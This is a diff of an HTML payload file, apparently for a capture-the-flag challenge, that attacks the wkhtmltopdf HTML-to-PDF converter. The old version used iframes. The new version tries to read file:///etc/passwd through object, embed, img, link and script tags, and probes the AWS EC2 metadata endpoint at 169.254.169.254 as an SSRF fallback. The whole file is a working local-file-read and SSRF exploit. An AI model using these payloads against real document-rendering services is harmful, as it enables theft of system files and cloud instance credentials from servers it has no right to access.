@@ -1,33 +1,68 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CTF File Leak via wkhtmltopdf</title>
+    <title>CTF File Leak (No iFrames)</title>
     <style>
         body { font-family: sans-serif; margin: 20px; }
         h1 { color: #333; }
-        pre { background-color: #f0f0f0; padding: 10px; border: 1px solid #ccc; white-space: pre-wrap; word-wrap: break-word; }
-        iframe { border: 1px solid #ddd; background-color: #fff; }
+        pre { background-color: #f0f0f0; padding: 15px; border: 1px solid #ccc; white-space: pre-wrap; word-wrap: break-word; font-size: 1.1em; }
+        .leak-attempt { margin-bottom: 25px; border: 1px dashed #bbb; padding: 15px; background-color: #f9f9f9; }
     </style>
 </head>
 <body>
-    <h1>Attempting to Leak /etc/passwd:</h1>
-    <p>This section tries to embed the Linux password file.</p>
-    <pre>
-        <iframe src="file:///etc/passwd" height="500" width="800"></iframe>
-    </pre>
+    <h1>Attempting File Leaks via various HTML tags:</h1>
+
+    <div class="leak-attempt">
+        <h2>1. Using &lt;object&gt; tag:</h2>
+        <p>This tries to embed the file as a generic object.</p>
+        <pre>
+            <object data="file:///etc/passwd" type="text/plain" width="800" height="400"></object>
+        </pre>
+    </div>
+
+    <div class="leak-attempt">
+        <h2>2. Using &lt;embed&gt; tag:</h2>
+        <p>Similar to object, but sometimes handled differently.</p>
+        <pre>
+            <embed src="file:///etc/passwd" type="text/plain" width="800" height="400">
+        </pre>
+    </div>
+
+    <div class="leak-attempt">
+        <h2>3. Using &lt;img&gt; tag (less likely for text, but good for testing):</h2>
+        <p>If the file content is interpreted as an image (e.g., text might show as broken image, but still processed).</p>
+        <pre>
+            <img src="file:///etc/passwd" alt="Attempt to load /etc/passwd" style="max-width:100%;">
+        </pre>
+    </div>
+
+    <div class="leak-attempt">
+        <h2>4. Using &lt;link&gt; tag for stylesheet (can sometimes expose content):</h2>
+        <p>If the file is loaded as a stylesheet, its content might appear in parsing errors or console, sometimes rendered.</p>
+        <pre>
+            <link rel="stylesheet" type="text/css" href="file:///etc/passwd">
+        </pre>
+    </div>
+
+    <div class="leak-attempt">
+        <h2>5. Using &lt;script&gt; tag (less likely for text file, but possible for JS or error messages):</h2>
+        <p>If the file is loaded as a script, its content might generate errors in the PDF's internal console or reveal parts of the file.</p>
+        <pre>
+            <script src="file:///etc/passwd"></script>
+        </pre>
+    </div>
+
+    <div class="leak-attempt">
+        <h2>6. Probing common AWS Metadata endpoint (SSRF fallback):</h2>
+        <p>Still includes this, just in case the server is on EC2 and this specific tag works.</p>
+        <pre>
+            <object data="http://169.254.169.254/latest/meta-data/" type="text/html" width="800" height="400"></object>
+        </pre>
+    </div>
 
     <hr>
-
-    <h1>Attempting to Leak AWS EC2 Metadata:</h1>
-    <p>This section targets AWS instance metadata, useful if the CTF server is on EC2.</p>
-    <pre>
-        <iframe src="http://169.254.169.254/latest/meta-data/" height="500" width="800"></iframe>
-    </pre>
-
-    <hr>
-
     <p style="margin-top: 30px; font-size: 0.9em; color: #666;">
-        If successful, the content of the targeted files should appear above in the generated PDF.
+        One of these sections should hopefully display the content of the targeted files if the `wkhtmltopdf` vulnerability allows it.
     </p>
 </body>
 </html>
